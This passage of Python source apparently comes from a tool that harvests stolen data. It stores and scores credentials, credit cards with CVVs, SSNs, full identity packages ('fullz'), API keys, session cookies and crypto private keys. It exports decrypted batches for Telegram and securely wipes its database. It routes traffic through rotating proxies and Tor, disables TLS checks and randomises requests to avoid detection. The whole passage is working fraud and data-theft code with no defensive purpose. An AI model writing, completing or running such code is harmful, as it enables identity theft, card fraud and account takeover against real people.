                (address, wallet_type, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def get_stats(self) -> Dict[str, Any]:
        """Get comprehensive database statistics."""
        with self._lock:
            stats = {}

            # Total unique records
            cursor = self._connection.execute("SELECT COUNT(*) FROM harvested_data")
            stats["total_harvested"] = cursor.fetchone()[0]

            # By type
            cursor = self._connection.execute(
                "SELECT data_type, COUNT(*) FROM harvested_data GROUP BY data_type"
            )
            stats["by_type"] = {row[0]: row[1] for row in cursor}

            # By source
            cursor = self._connection.execute(
                "SELECT source, COUNT(*) FROM harvested_data GROUP BY source"
            )
            stats["by_source"] = {row[0]: row[1] for row in cursor}

            # High value count
            cursor = self._connection.execute(
                "SELECT COUNT(*) FROM harvested_data WHERE confidence >= ?",
                (OanksConfig.HIGH_VALUE_THRESHOLD,)
            )
            stats["high_value"] = cursor.fetchone()[0]

            # Database size
            try:
                stats["db_size_bytes"] = os.path.getsize(self._db_path)
            except:
                stats["db_size_bytes"] = 0

            # Per-table counts
            for table in ["credentials", "credit_cards", "ssns", "phone_numbers",
                         "fullz", "api_keys", "session_tokens", "oauth_tokens",
                         "crypto_wallets", "private_keys"]:
                cursor = self._connection.execute(f"SELECT COUNT(*) FROM {table}")
                stats[f"count_{table}"] = cursor.fetchone()[0]

            return stats

    def export_batch(self, data_type: str, limit: int = 500) -> List[str]:
        """Export decrypted batch for Telegram."""
        with self._lock:
            cursor = self._connection.execute(
                "SELECT raw_data_enc FROM harvested_data WHERE data_type = ? LIMIT ?",
                (data_type, limit)
            )
            results = []
            for row in cursor:
                try:
                    decrypted = self._crypto.decrypt(row[0])
                    results.append(decrypted)
                except:
                    pass
            return results

    def export_encrypted_file(self, data_type: str, filepath: str, limit: int = 1000):
        """Export encrypted batch to file."""
        with self._lock:
            cursor = self._connection.execute(
                "SELECT raw_data_enc, hash_id, source, confidence, timestamp FROM harvested_data WHERE data_type = ? LIMIT ?",
                (data_type, limit)
            )

            with open(filepath, "w") as f:
                for row in cursor:
                    entry = {
                        "encrypted_data": row[0],
                        "hash_id": row[1],
                        "source": row[2],
                        "confidence": row[3],
                        "timestamp": row[4],
                    }
                    f.write(json.dumps(entry) + "\n")

    def close(self):
        """Close database connection."""
        with self._lock:
            if self._connection:
                self._connection.close()
                self._connection = None

    def secure_wipe(self):
        """Securely wipe database."""
        self.close()
        if os.path.exists(self._db_path):
            size = os.path.getsize(self._db_path)
            with open(self._db_path, "r+b") as f:
                for _ in range(3):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
                f.seek(0)
                f.write(b"\x00" * size)
                f.flush()
                os.fsync(f.fileno())
            os.remove(self._db_path)


# ============================================================================
# SECTION 8: DATA VALIDATOR — Email, Luhn, SSN, E.164, JWT, password strength
# ============================================================================

class DataValidator:
    """Military-grade data validation with confidence scoring."""

    __slots__ = ("_lock",)

    # SSN area codes by state
    SSN_AREAS = {
        "001-003": "NH", "004-007": "ME", "008-009": "VT", "010-034": "MA",
        "035-039": "RI", "040-049": "CT", "050-134": "NY", "135-158": "NJ",
        "159-211": "PA", "212-220": "MD", "221-222": "DE", "223-231": "VA",
        "232-232": "WV", "233-236": "WV", "237-246": "NC", "247-251": "SC",
        "252-260": "GA", "261-267": "FL", "268-302": "OH", "303-317": "IN",
        "318-361": "IL", "362-386": "MI", "387-399": "WI", "400-407": "KY",
        "408-415": "TN", "416-424": "AL", "425-428": "MS", "429-432": "AR",
        "433-439": "LA", "440-448": "OK", "449-467": "TX", "468-477": "MN",
        "478-485": "IA", "486-500": "MO", "501-502": "ND", "503-504": "SD",
        "505-508": "NE", "509-515": "KS", "516-517": "MT", "518-519": "ID",
        "520-520": "WY", "521-524": "CO", "525-585": "NM", "586-586": "AZ",
        "587-588": "UT", "589-595": "NV", "596-599": "WA", "600-601": "MT",
        "602-626": "CA", "627-699": "Reserved", "700-728": "Railroad",
        "729-733": "Enumeration", "734-749": "TX", "750-751": "CO",
        "752-755": "CA", "756-763": "FL", "764-899": "Reserved",
        "900-999": "Invalid"
    }

    def __init__(self):
        self._lock = threading.RLock()

    def validate_email(self, email: str) -> bool:
        """Validate email format per RFC 5322."""
        if not email or len(email) > 254:
            return False
        return bool(OanksPatterns.EMAIL_VALID.match(email))

    def validate_card_luhn(self, number: str) -> bool:
        """Validate credit card using Luhn algorithm."""
        digits = "".join(c for c in number if c.isdigit())
        if len(digits) < 13 or len(digits) > 19:
            return False

        total = 0
        reverse = digits[::-1]
        for i, digit in enumerate(reverse):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        return total % 10 == 0

    def detect_card_brand(self, number: str) -> str:
        """Detect credit card brand from number."""
        digits = "".join(c for c in number if c.isdigit())

        patterns = {
            "visa": r"^4[0-9]{12}(?:[0-9]{3})?$",
            "mastercard": r"^5[1-5][0-9]{14}$",
            "amex": r"^3[47][0-9]{13}$",
            "diners": r"^3(?:0[0-5]|[68][0-9])[0-9]{11}$",
            "discover": r"^6(?:011|5[0-9]{2})[0-9]{12}$",
            "jcb": r"^(?:2131|1800|35\d{3})\d{11}$",
        }

        for brand, pattern in patterns.items():
            if re.match(pattern, digits):
                return brand
        return "unknown"

    def validate_ssn_format(self, ssn: str) -> bool:
        """Validate SSN format and area code."""
        cleaned = ssn.replace("-", "")
        if len(cleaned) != 9 or not cleaned.isdigit():
            return False

        area = int(cleaned[:3])
        group = int(cleaned[3:5])
        serial = int(cleaned[5:])

        # Invalid area codes
        if area in (0, 666) or 900 <= area <= 999:
            return False

        # Invalid group/serial
        if group == 0 or serial == 0:
            return False

        return True

    def get_ssn_state(self, ssn: str) -> str:
        """Get probable state from SSN area code."""
        cleaned = ssn.replace("-", "")
        if len(cleaned) != 9:
            return "unknown"

        area = int(cleaned[:3])

        for range_str, state in self.SSN_AREAS.items():
            if "-" in range_str:
                low, high = map(int, range_str.split("-"))
                if low <= area <= high:
                    return state
        return "unknown"

    def validate_phone_e164(self, phone: str) -> bool:
        """Validate phone number in E.164 format."""
        cleaned = "".join(c for c in phone if c.isdigit() or c == "+")
        if not cleaned.startswith("+"):
            return False
        digits = cleaned[1:]
        if len(digits) < 7 or len(digits) > 15:
            return False
        return digits.isdigit()

    def normalize_phone(self, phone: str) -> str:
        """Normalize phone to E.164 format."""
        digits = "".join(c for c in phone if c.isdigit())
        if len(digits) == 10:
            return f"+1{digits}"
        elif len(digits) == 11 and digits.startswith("1"):
            return f"+{digits}"
        elif len(digits) > 7:
            return f"+{digits}"
        return phone

    def validate_jwt_format(self, token: str) -> bool:
        """Validate JWT has 3 base64url parts."""
        parts = token.split(".")
        if len(parts) != 3:
            return False
        for part in parts:
            if not part:
                return False
            # Check base64url characters
            if not re.match(r"^[A-Za-z0-9_-]+$", part):
                return False
        return True

    def detect_jwt_platform(self, token: str) -> str:
        """Detect JWT platform from payload."""
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload = parts[1]
                # Pad for base64
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += "=" * padding
                decoded = base64.urlsafe_b64decode(payload)
                data = json.loads(decoded)

                iss = data.get("iss", "")
                if "google" in iss:
                    return "google"
                elif "microsoft" in iss:
                    return "microsoft"
                elif "auth0" in iss:
                    return "auth0"
                elif "okta" in iss:
                    return "okta"
                elif "amazon" in iss:
                    return "aws"
                elif "apple" in iss:
                    return "apple"
                elif "facebook" in iss:
                    return "facebook"

                # Check for platform-specific claims
                if "firebase" in str(data):
                    return "firebase"
                if "shopify" in str(data):
                    return "shopify"

                return "unknown"
        except:
            pass
        return "unknown"

    def password_strength(self, password: str) -> float:
        """Calculate password strength score 0.0-1.0."""
        if not password:
            return 0.0

        score = 0.0
        length = len(password)

        # Length scoring
        if length >= 8:
            score += 0.1
        if length >= 12:
            score += 0.1
        if length >= 16:
            score += 0.1
        if length >= 20:
            score += 0.1

        # Character variety
        if re.search(r"[a-z]", password):
            score += 0.1
        if re.search(r"[A-Z]", password):
            score += 0.1
        if re.search(r"[0-9]", password):
            score += 0.1
        if re.search(r"[^a-zA-Z0-9]", password):
            score += 0.1

        # Complexity bonus
        if re.search(r"[a-z].*[A-Z]|[A-Z].*[a-z]", password):
            score += 0.05
        if re.search(r"[0-9].*[^a-zA-Z0-9]|[^a-zA-Z0-9].*[0-9]", password):
            score += 0.05

        # Entropy estimation
        charset_size = 0
        if re.search(r"[a-z]", password): charset_size += 26
        if re.search(r"[A-Z]", password): charset_size += 26
        if re.search(r"[0-9]", password): charset_size += 10
        if re.search(r"[^a-zA-Z0-9]", password): charset_size += 32

        if charset_size > 0:
            entropy = length * math.log2(charset_size)
            if entropy > 60:
                score += 0.1
            elif entropy > 40:
                score += 0.05

        return min(score, 1.0)

    def validate_crypto_address(self, address: str, wallet_type: str = "") -> bool:
        """Validate cryptocurrency address format."""
        if wallet_type == "btc" or address.startswith(("1", "3", "bc1")):
            if address.startswith("1") or address.startswith("3"):
                return len(address) >= 26 and len(address) <= 35
            elif address.startswith("bc1"):
                return len(address) >= 39 and len(address) <= 59
        elif wallet_type == "eth" or address.startswith("0x"):
            return len(address) == 42 and all(c in "0123456789abcdefABCDEF" for c in address[2:])
        elif wallet_type == "ltc" or address.startswith(("L", "ltc1")):
            if address.startswith("L"):
                return len(address) >= 26 and len(address) <= 35
            elif address.startswith("ltc1"):
                return len(address) >= 39
        elif wallet_type == "xmr" or address.startswith(("4", "8")):
            return len(address) >= 95 and len(address) <= 106
        return False

    def calculate_confidence(self, data_type: str, data: Dict[str, Any]) -> float:
        """Calculate confidence score for extracted data."""
        score = 0.0

        if data_type == "credentials":
            email = data.get("email", "")
            password = data.get("password", "")

            if self.validate_email(email):
                score += 0.3
            if "@gmail.com" in email or "@yahoo.com" in email or "@outlook.com" in email:
                score += 0.1
            if len(password) >= 8:
                score += 0.1
            if self.password_strength(password) > 0.3:
                score += 0.2
            if ":" in email + password or "|" in email + password:
                score += 0.1
            if data.get("source") in ("pastebin", "github", "forums"):
                score += 0.1
            if re.search(r"[0-9]", password) and re.search(r"[a-zA-Z]", password):
                score += 0.1

        elif data_type == "credit_cards":
            number = data.get("number", "")
            if self.validate_card_luhn(number):
                score += 0.5
            brand = self.detect_card_brand(number)
            if brand != "unknown":
                score += 0.2
            if data.get("cvv") and len(data.get("cvv", "")) in (3, 4):
                score += 0.2
            if data.get("expiry"):
                score += 0.1

        elif data_type == "ssns":
            ssn = data.get("ssn", "")
            if self.validate_ssn_format(ssn):
                score += 0.5
            state = self.get_ssn_state(ssn)
            if state != "unknown" and state != "Invalid":
                score += 0.3
            if data.get("source") in ("pastebin", "forums", "darkweb"):
                score += 0.2

        elif data_type == "phone_numbers":
            phone = data.get("number", "")
            normalized = self.normalize_phone(phone)
            if self.validate_phone_e164(normalized):
                score += 0.5
            if len(phone) >= 10:
                score += 0.2
            if data.get("country_code"):
                score += 0.2
            if data.get("carrier"):
                score += 0.1

        elif data_type == "api_keys":
            key = data.get("key", "")
            if len(key) >= 20:
                score += 0.2
            service = data.get("service", "")
            if service and service != "unknown":
                score += 0.3
            if key.startswith(("sk-", "AKIA", "ghp_", "AIza")):
                score += 0.3
            if data.get("source") in ("github", "pastebin"):
                score += 0.2

        elif data_type == "crypto_wallets":
            address = data.get("address", "")
            wallet_type = data.get("type", "")
            if self.validate_crypto_address(address, wallet_type):
                score += 0.5
            if wallet_type and wallet_type != "unknown":
                score += 0.3
            if len(address) >= 26:
                score += 0.2

        elif data_type == "private_keys":
            key = data.get("key", "")
            if key.startswith("-----BEGIN"):
                score += 0.5
            if "PRIVATE KEY" in key:
                score += 0.3
            if len(key) > 100:
                score += 0.2

        elif data_type == "fullz":
            required = ["first_name", "last_name", "ssn", "dob", "address"]
            present = sum(1 for field in required if data.get(field))
            score = (present / len(required)) * 0.7
            if data.get("phone") and data.get("email"):
                score += 0.2
            if data.get("credit_score"):
                score += 0.1

        elif data_type == "discord_webhooks":
            url = data.get("url", "")
            if OanksPatterns.DISCORD_WEBHOOK.match(url):
                score += 0.8
            if "discord" in url:
                score += 0.2

        elif data_type == "telegram_bots":
            token = data.get("token", "")
            if OanksPatterns.TELEGRAM_BOT.match(token):
                score += 0.9

        return min(score, 1.0)


# ============================================================================
# SECTION 9: PROXY HELL BRIDGE — Load, health check, rotation, dead removal
# ============================================================================

class ProxyHellBridge:
    """Bridge to Phase 2 ProxyHellCore. Manages proxy loading and rotation."""

    __slots__ = ("_proxies", "_alive_proxies", "_current_index", "_lock",
                 "_health_thread", "_health_active", "_last_refresh", "_stats")

    def __init__(self, proxy_list: List[str] = None):
        self._proxies = []
        self._alive_proxies = []
        self._current_index = 0
        self._lock = threading.RLock()
        self._health_thread = None
        self._health_active = False
        self._last_refresh = 0
        self._stats = {
            "total_loaded": 0,
            "alive_count": 0,
            "dead_count": 0,
            "rotations": 0,
        }

        if proxy_list:
            self.load_proxies(proxy_list)

    def load_proxies(self, proxy_list: List[str]):
        """Load proxies from list of strings (ip:port or ip:port:protocol)."""
        with self._lock:
            for proxy_str in proxy_list:
                proxy_str = proxy_str.strip()
                if not proxy_str:
                    continue

                parts = proxy_str.split(":")
                if len(parts) >= 2:
                    ip = parts[0]
                    try:
                        port = int(parts[1])
                    except:
                        continue
                    protocol = parts[2] if len(parts) >= 3 else "http"

                    self._proxies.append({
                        "ip": ip,
                        "port": port,
                        "protocol": protocol.lower(),
                        "failures": 0,
                        "successes": 0,
                        "last_used": 0,
                        "speed_ms": 0,
                    })

            self._stats["total_loaded"] = len(self._proxies)
            self._alive_proxies = list(self._proxies)

    def load_from_file(self, filepath: str):
        """Load proxies from file."""
        if not os.path.exists(filepath):
            return
        with open(filepath, "r") as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        self.load_proxies(proxies)

    def get_proxy(self) -> Optional[Dict[str, Any]]:
        """Get next proxy using round-robin rotation."""
        with self._lock:
            if not self._alive_proxies:
                return None

            proxy = self._alive_proxies[self._current_index]
            self._current_index = (self._current_index + 1) % len(self._alive_proxies)
            self._stats["rotations"] += 1
            proxy["last_used"] = time.time()
            return proxy

    def get_proxy_url(self) -> Optional[str]:
        """Get proxy URL for urllib."""
        proxy = self.get_proxy()
        if not proxy:
            return None
        return f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"

    def report_result(self, proxy: Dict[str, Any], success: bool):
        """Report proxy usage result."""
        with self._lock:
            if success:
                proxy["successes"] += 1
                proxy["failures"] = max(0, proxy["failures"] - 1)
            else:
                proxy["failures"] += 1
                if proxy["failures"] >= 5:
                    self._remove_proxy(proxy)

    def _remove_proxy(self, proxy: Dict[str, Any]):
        """Remove dead proxy from alive list."""
        if proxy in self._alive_proxies:
            self._alive_proxies.remove(proxy)
            self._stats["dead_count"] += 1
            self._stats["alive_count"] = len(self._alive_proxies)
            if self._current_index >= len(self._alive_proxies):
                self._current_index = 0

    def _health_check_proxy(self, proxy: Dict[str, Any]) -> bool:
        """Check if proxy is alive."""
        try:
            url = f"http://httpbin.org/ip"
            proxy_url = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"

            proxy_handler = urllib.request.ProxyHandler({
                "http": proxy_url,
                "https": proxy_url,
            })
            opener = urllib.request.build_opener(proxy_handler)
            opener.addheaders = [(k, v) for k, v in OanksConfig.get_random_headers().items()]

            start = time.time()
            response = opener.open(url, timeout=10)
            elapsed = (time.time() - start) * 1000

            proxy["speed_ms"] = elapsed
            return response.getcode() == 200
        except:
            return False

    def health_check_all(self):
        """Health check all proxies and filter alive ones."""
        alive = []

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._health_check_proxy, p): p for p in self._proxies}
            for future in as_completed(futures):
                proxy = futures[future]
                try:
                    if future.result(timeout=15):
                        alive.append(proxy)
                except:
                    pass

        with self._lock:
            self._alive_proxies = alive
            self._stats["alive_count"] = len(alive)
            self._stats["dead_count"] = len(self._proxies) - len(alive)
            self._current_index = 0
            self._last_refresh = time.time()

    def start_health_monitor(self, interval: int = 60):
        """Start background health monitoring thread."""
        def monitor_loop():
            while self._health_active:
                try:
                    self.health_check_all()
                    time.sleep(interval)
                except:
                    time.sleep(interval)

        self._health_active = True
        self._health_thread = threading.Thread(target=monitor_loop, daemon=True)
        self._health_thread.start()

    def stop_health_monitor(self):
        """Stop health monitoring."""
        self._health_active = False
        if self._health_thread:
            self._health_thread.join(timeout=5)

    def get_stats(self) -> Dict[str, Any]:
        """Get proxy statistics."""
        with self._lock:
            return dict(self._stats)


# ============================================================================
# SECTION 10: STEALTH REQUESTER — Random UAs, rate limiting, Tor support
# ============================================================================

class StealthRequester:
    """Military-grade stealth requester with rotation and evasion."""

    __slots__ = ("_proxy_bridge", "_last_request_time", "_request_count",
                 "_lock", "_cookie_jar", "_session_id", "_stats")

    def __init__(self, proxy_bridge: ProxyHellBridge = None):
        self._proxy_bridge = proxy_bridge
        self._last_request_time = 0
        self._request_count = 0
        self._lock = threading.RLock()
        self._cookie_jar = http.cookiejar.CookieJar()
        self._session_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        self._stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "total_bytes": 0,
        }

    def _rate_limit(self):
        """Apply random rate limiting to avoid detection."""
        with self._lock:
            elapsed = time.time() - self._last_request_time
            min_delay = random.uniform(0.1, 0.5)
            if elapsed < min_delay:
                time.sleep(min_delay - elapsed)
            self._last_request_time = time.time()

    def _get_opener(self, proxy_url: str = None) -> urllib.request.OpenerDirector:
        """Build urllib opener with proxy and headers."""
        handlers = []

        if proxy_url:
            proxy_handler = urllib.request.ProxyHandler({
                "http": proxy_url,
                "https": proxy_url,
            })
            handlers.append(proxy_handler)

        # Cookie handler
        cookie_handler = urllib.request.HTTPCookieProcessor(self._cookie_jar)
        handlers.append(cookie_handler)

        # HTTPS handler with custom SSL context
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        https_handler = urllib.request.HTTPSHandler(context=ssl_context)
        handlers.append(https_handler)

        opener = urllib.request.build_opener(*handlers)
        return opener

    def request(self, url: str, method: str = "GET", data: bytes = None,
                headers: Dict[str, str] = None, timeout: int = 25,
                retries: int = 3) -> Tuple[int, bytes, Dict[str, str]]:
        """Make stealth HTTP request with retry logic."""
        self._rate_limit()

        with self._lock:
            self._request_count += 1
            self._stats["total_requests"] += 1

        # Build headers
        req_headers = OanksConfig.get_random_headers()
        if headers:
            req_headers.update(headers)

        # Add session fingerprint evasion
        req_headers["X-Request-ID"] = hashlib.sha256(
            f"{self._session_id}{time.time()}".encode()
        ).hexdigest()[:16]

        last_error = None

        for attempt in range(retries):
            try:
                proxy_url = None
                if self._proxy_bridge:
                    proxy_url = self._proxy_bridge.get_proxy_url()

                opener = self._get_opener(proxy_url)

                req = urllib.request.Request(
                    url,
                    data=data,
                    headers=req_headers,
                    method=method,
                )

                start = time.time()
                response = opener.open(req, timeout=timeout)
                elapsed = time.time() - start

                status = response.getcode()
                body = response.read()
                resp_headers = dict(response.headers)

                # Handle compression
                content_encoding = resp_headers.get("Content-Encoding", "")
                if "gzip" in content_encoding:
                    body = gzip.decompress(body)
                elif "deflate" in content_encoding:
                    body = zlib.decompress(body)
                elif "br" in content_encoding:
                    try:
                        import brotli
                        body = brotli.decompress(body)
                    except:
                        pass

                with self._lock:
                    self._stats["successful_requests"] += 1
                    self._stats["total_bytes"] += len(body)

                if self._proxy_bridge and proxy_url:
                    self._proxy_bridge.report_result(
                        {"ip": proxy_url.split("://")[1].split(":")[0]}, True
                    )

                return status, body, resp_headers

            except urllib.error.HTTPError as e:
                last_error = e
                if e.code == 429:  # Rate limited
                    time.sleep(random.uniform(5, 15))
                elif e.code in (403, 451):
                    time.sleep(random.uniform(2, 5))
                else:
                    break

            except Exception as e:
                last_error = e
                if self._proxy_bridge and proxy_url:
                    self._proxy_bridge.report_result(
                        {"ip": proxy_url.split("://")[1].split(":")[0]}, False
                    )
                time.sleep(random.uniform(1, 3))

        with self._lock:
            self._stats["failed_requests"] += 1

        return 0, b"", {}

    def tor_request(self, url: str, method: str = "GET", data: bytes = None,
                    headers: Dict[str, str] = None, timeout: int = 30) -> Tuple[int, bytes, Dict[str, str]]:
        """Make request through Tor SOCKS5 proxy."""
        tor_proxy = "socks5://127.0.0.1:9050"

        # Temporarily override proxy bridge
        original_bridge = self._proxy_bridge
        temp_bridge = ProxyHellBridge(["127.0.0.1:9050:socks5"])
        self._proxy_bridge = temp_bridge

        try:
            return self.request(url, method, data, headers, timeout)
        finally:
            self._proxy_bridge = original_bridge

    def get_stats(self) -> Dict[str, Any]:
        """Get request statistics."""
        with self._lock:
            return dict(self._stats)


# ============================================================================
# SECTION 11: DATA EXTRACTOR — 9 extraction methods with validation
# ============================================================================

class DataExtractor:
    """Military-grade data extraction engine. Extracts 9 data types from raw text."""

    __slots__ = ("_validator", "_lock")

    def __init__(self, validator: DataValidator):
        self._validator = validator
        self._lock = threading.RLock()

    def extract_all(self, text: str, source: str) -> Dict[str, List[Dict]]:
        """Extract all data types from text."""
        results = {
            "credentials": [],
            "credit_cards": [],
            "ssns": [],
            "phone_numbers": [],
            "fullz": [],
            "api_keys": [],
            "session_tokens": [],
            "crypto_wallets": [],
            "private_keys": [],
            "discord_webhooks": [],
            "telegram_bots": [],
            "db_connections": [],
            "ssh_keys": [],
        }

        results["credentials"] = self.extract_credentials(text, source)
        results["credit_cards"] = self.extract_cards(text, source)
        results["ssns"] = self.extract_ssns(text, source)
        results["phone_numbers"] = self.extract_phones(text, source)
        results["fullz"] = self.extract_fullz(text, source)
        results["api_keys"] = self.extract_api_keys(text, source)
        results["session_tokens"] = self.extract_sessions(text, source)
        results["crypto_wallets"] = self.extract_crypto_wallets(text, source)
        results["private_keys"] = self.extract_private_keys(text, source)
        results["discord_webhooks"] = self.extract_discord_webhooks(text, source)
        results["telegram_bots"] = self.extract_telegram_bots(text, source)
        results["db_connections"] = self.extract_db_connections(text, source)
        results["ssh_keys"] = self.extract_ssh_keys(text, source)

        return results

    def extract_credentials(self, text: str, source: str) -> List[Dict]:
        """Extract email:password credentials."""
        results = []
        seen = set()

        # Pattern 1: email:password
        for match in OanksPatterns.CREDENTIALS.finditer(text):
            raw = match.group()

            # Split on delimiter
            for delimiter in [":", "|", "\t", " "]:
                if delimiter in raw:
                    parts = raw.split(delimiter, 1)
                    if len(parts) == 2:
                        email = parts[0].strip()
                        password = parts[1].strip()
                        break
            else:
                continue

            # Validate email
            if not self._validator.validate_email(email):
                continue

            key = f"{email}:{password}"
            if key in seen:
                continue
            seen.add(key)

            data = {
                "email": email,
                "password": password,
                "source": source,
                "raw": raw,
            }
            confidence = self._validator.calculate_confidence("credentials", data)

            if confidence >= 0.3:
                results.append({
                    "type": "credentials",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        # Pattern 2: JSON credentials
        try:
            json_matches = re.findall(r'"email"\s*:\s*"([^"]+)"\s*,\s*"password"\s*:\s*"([^"]+)"', text)
            for email, password in json_matches:
                if not self._validator.validate_email(email):
                    continue
                key = f"{email}:{password}"
                if key in seen:
                    continue
                seen.add(key)

                data = {
                    "email": email,
                    "password": password,
                    "source": source,
                    "raw": f'{"email": "{email}", "password": "{password}"}',
                }
                confidence = self._validator.calculate_confidence("credentials", data)

                if confidence >= 0.3:
                    results.append({
                        "type": "credentials",
                        "data": data,
                        "confidence": confidence,
                        "validated": True,
                    })
        except:
            pass

        return results

    def extract_cards(self, text: str, source: str) -> List[Dict]:
        """Extract credit card numbers."""
        results = []
        seen = set()

        for match in OanksPatterns.CREDIT_CARDS.finditer(text):
            number = match.group().replace(" ", "").replace("-", "")

            if number in seen:
                continue
            seen.add(number)

            if not self._validator.validate_card_luhn(number):
                continue

            # Try to find CVV and expiry nearby
            context = text[max(0, match.start() - 200):min(len(text), match.end() + 200)]

            cvv_match = re.search(r"\b(\d{3,4})\b", context)
            cvv = cvv_match.group(1) if cvv_match else ""

            expiry_match = re.search(r"(\d{2})[\/](\d{2,4})", context)
            expiry = f"{expiry_match.group(1)}/{expiry_match.group(2)}" if expiry_match else ""

            data = {
                "number": number,
                "cvv": cvv,
                "expiry": expiry,
                "brand": self._validator.detect_card_brand(number),
                "source": source,
            }
            confidence = self._validator.calculate_confidence("credit_cards", data)

            if confidence >= 0.3:
                results.append({
                    "type": "credit_cards",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_ssns(self, text: str, source: str) -> List[Dict]:
        """Extract Social Security Numbers."""
        results = []
        seen = set()

        for match in OanksPatterns.SSN.finditer(text):
            ssn = match.group()

            if ssn in seen:
                continue
            seen.add(ssn)

            if not self._validator.validate_ssn_format(ssn):
                continue

            data = {
                "ssn": ssn,
                "state": self._validator.get_ssn_state(ssn),
                "source": source,
            }
            confidence = self._validator.calculate_confidence("ssns", data)

            if confidence >= 0.3:
                results.append({
                    "type": "ssns",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_phones(self, text: str, source: str) -> List[Dict]:
        """Extract phone numbers."""
        results = []
        seen = set()

        for match in OanksPatterns.PHONE.finditer(text):
            raw = match.group()
            normalized = self._validator.normalize_phone(raw)

            if normalized in seen:
                continue
            seen.add(normalized)

            if not self._validator.validate_phone_e164(normalized):
                continue

            data = {
                "number": normalized,
                "raw": raw,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("phone_numbers", data)

            if confidence >= 0.3:
                results.append({
                    "type": "phone_numbers",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_fullz(self, text: str, source: str) -> List[Dict]:
        """Extract full identity packages (fullz)."""
        results = []

        # Look for structured fullz data
        # Pattern: blocks with multiple identity fields
        blocks = re.split(r"\n\n+|\r\n\r\n+", text)

        for block in blocks:
            if len(block) < 50:
                continue

            data = {"source": source}

            # Extract fields
            fn_match = OanksPatterns.FULLZ_NAME.search(block)
            if fn_match:
                data["first_name"] = fn_match.group(1)

            ln_match = OanksPatterns.FULLZ_LAST.search(block)
            if ln_match:
                data["last_name"] = ln_match.group(1)

            dob_match = OanksPatterns.FULLZ_DOB.search(block)
            if dob_match:
                data["dob"] = dob_match.group(1)

            addr_match = OanksPatterns.FULLZ_ADDRESS.search(block)
            if addr_match:
                data["address"] = addr_match.group(1)

            city_match = OanksPatterns.FULLZ_CITY.search(block)
            if city_match:
                data["city"] = city_match.group(1)

            state_match = OanksPatterns.FULLZ_STATE.search(block)
            if state_match:
                data["state"] = state_match.group(1)

            zip_match = OanksPatterns.FULLZ_ZIP.search(block)
            if zip_match:
                data["zip"] = zip_match.group(1)

            country_match = OanksPatterns.FULLZ_COUNTRY.search(block)
            if country_match:
                data["country"] = country_match.group(1)

            # Also look for SSN in the block
            ssn_match = OanksPatterns.SSN.search(block)
            if ssn_match:
                data["ssn"] = ssn_match.group()

            # Look for phone
            phone_match = OanksPatterns.PHONE.search(block)
            if phone_match:
                data["phone"] = self._validator.normalize_phone(phone_match.group())

            # Look for email
            email_match = re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", block)
            if email_match:
                data["email"] = email_match.group()

            # Need at least 3 fields to be considered fullz
            if len(data) >= 4:
                confidence = self._validator.calculate_confidence("fullz", data)

                if confidence >= 0.3:
                    results.append({
                        "type": "fullz",
                        "data": data,
                        "confidence": confidence,
                        "validated": True,
                    })

        return results

    def extract_api_keys(self, text: str, source: str) -> List[Dict]:
        """Extract API keys and tokens."""
        results = []
        seen = set()

        for match in OanksPatterns.API_KEY.finditer(text):
            key = match.group()

            if key in seen:
                continue
            seen.add(key)

            # Detect service
            service = "unknown"
            if key.startswith("sk-") or key.startswith("pk-"):
                service = "stripe"
            elif key.startswith("AKIA") or key.startswith("ASIA"):
                service = "aws"
            elif key.startswith("ghp_") or key.startswith("gho_"):
                service = "github"
            elif key.startswith("xoxb-") or key.startswith("xoxa-"):
                service = "slack"
            elif key.startswith("AIza"):
                service = "google"
            elif "Bearer" in key:
                service = "bearer"

            data = {
                "key": key,
                "service": service,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("api_keys", data)

            if confidence >= 0.3:
                results.append({
                    "type": "api_keys",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        # Also check for JWT tokens
        for match in OanksPatterns.JWT.finditer(text):
            token = match.group()
            if token in seen:
                continue
            seen.add(token)

            platform = self._validator.detect_jwt_platform(token)

            data = {
                "key": token,
                "service": platform,
                "source": source,
                "is_jwt": True,
            }
            confidence = self._validator.calculate_confidence("api_keys", data)

            if confidence >= 0.3:
                results.append({
                    "type": "api_keys",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_sessions(self, text: str, source: str) -> List[Dict]:
        """Extract session tokens and cookies."""
        results = []
        seen = set()

        for match in OanksPatterns.SESSION.finditer(text):
            token = match.group()

            if token in seen:
                continue
            seen.add(token)

            # Determine token type
            token_type = "session"
            if "csrf" in token.lower() or "xsrf" in token.lower():
                token_type = "csrf"
            elif "jwt" in token.lower():
                token_type = "jwt"
            elif "auth" in token.lower():
                token_type = "auth"

            data = {
                "token": token.split("=")[-1] if "=" in token else token,
                "type": token_type,
                "source": source,
            }

            results.append({
                "type": "session_tokens",
                "data": data,
                "confidence": 0.5,
                "validated": True,
            })

        # Extract cookies
        for match in OanksPatterns.COOKIE.finditer(text):
            cookie_str = match.group(1)
            if cookie_str in seen:
                continue
            seen.add(cookie_str)

            data = {
                "token": cookie_str,
                "type": "cookie",
                "source": source,
            }

            results.append({
                "type": "session_tokens",
                "data": data,
                "confidence": 0.4,
                "validated": True,
            })

        return results

